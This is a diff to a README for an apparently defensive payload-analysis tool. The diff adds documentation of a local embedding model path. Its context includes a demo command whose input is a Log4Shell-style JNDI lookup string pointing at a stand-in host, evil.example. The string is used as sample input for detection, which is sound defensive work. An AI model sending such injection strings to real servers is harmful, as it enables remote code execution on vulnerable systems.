@@ -41,6 +41,14 @@ python tests/test_nova.py
 python main.py --mode payload --input 'GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim' --demo-index
 ```
 
+The default embedding model path is local:
+
+```text
+libs/nova-f/models/all-MiniLM-L6-v2
+```
+
+This avoids HuggingFace downloads when the NOVA-F model files are present locally.
+
 ## PCAP Demo
 
 ```bash
